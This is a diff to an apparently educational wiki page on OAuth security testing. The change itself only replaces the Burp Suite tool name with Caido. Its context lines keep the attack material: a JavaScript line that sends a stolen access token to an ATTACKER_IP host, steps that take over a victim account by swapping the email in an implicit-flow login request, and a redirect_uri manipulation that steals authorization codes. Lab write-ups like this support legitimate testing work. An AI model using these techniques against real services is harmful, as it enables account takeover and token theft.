@@ -34,7 +34,7 @@ Identifying OAuth in use: look for login options like "Sign in with Google/Faceb
 
 ### 1. Identify the OAuth Flow
 
-Observe login HTTP traffic in Burp. Identify:
+Observe login HTTP traffic in Caido. Identify:
 
 ```
 GET /authorize?response_type=code&client_id=<id>&redirect_uri=<uri>&scope=profile&state=<token>
@@ -130,7 +130,7 @@ img.src = 'http://ATTACKER_IP:8081/steal_token?token=' + accessToken;
 In the implicit grant flow, the client receives the access token directly and then sends the user's profile data (including email) to the server via a POST request. If the server trusts client-supplied identity data without verifying the token signature against the claimed identity, an attacker can substitute another user's email in that POST:
 
 1. Log in legitimately via OAuth implicit flow. Intercept the POST request that submits the access token and user data to the client application (e.g., `POST /authenticate`).
-2. In Burp Repeater, change the email parameter to the victim's email address (e.g., `carlos@carlos-montoya.net`).
+2. In Caido Replay, change the email parameter to the victim's email address (e.g., `carlos@carlos-montoya.net`).
 3. Send the request. The server accepts the token and logs you in as the victim without re-validating that the token belongs to that email.
 4. Right-click the modified POST request → "Request in browser" → "In original session" to import the session into the browser.
 
@@ -391,7 +391,7 @@ Test focus: confirm sender-constraining is actually enforced end to end. A DPoP-
 
 ## Tools
 
-- [[burp-suite]] — intercept OAuth flows, manipulate parameters
+- [[caido]] — intercept OAuth flows, manipulate parameters
 - [[wiki/tools/ffuf]] — enumerate OAuth endpoint paths
 - Python `requests` — script token exchange flows
 
@@ -403,7 +403,7 @@ The OAuth provider uses the implicit grant. The client POSTs the received access
 
 **Steps:**
 1. Log in via the social media OAuth flow. Intercept the POST request that authenticates to the client app (contains `access_token` and `email` fields).
-2. In Burp Repeater, change the `email` value to the victim's email (e.g., `carlos@carlos-montoya.net`).
+2. In Caido Replay, change the `email` value to the victim's email (e.g., `carlos@carlos-montoya.net`).
 3. Send the request — the server accepts it and creates a session for the victim.
 4. Right-click the modified request → "Request in browser" → "In original session" to import the session cookie into the browser.
 
@@ -465,7 +465,7 @@ The OAuth server accepts arbitrary `redirect_uri` values without validating agai
 
 **Steps:**
 1. Log in and study the OAuth flow. Identify the `GET /auth?client_id=[...]` authorization request.
-2. In Burp Repeater, change `redirect_uri` to the exploit server URL — confirm no error is returned and the server issues a redirect to the attacker's domain with `?code=` appended.
+2. In Caido Replay, change `redirect_uri` to the exploit server URL — confirm no error is returned and the server issues a redirect to the attacker's domain with `?code=` appended.
 3. On the exploit server, create an iframe that triggers the authorization request for a victim:
 
 ```html
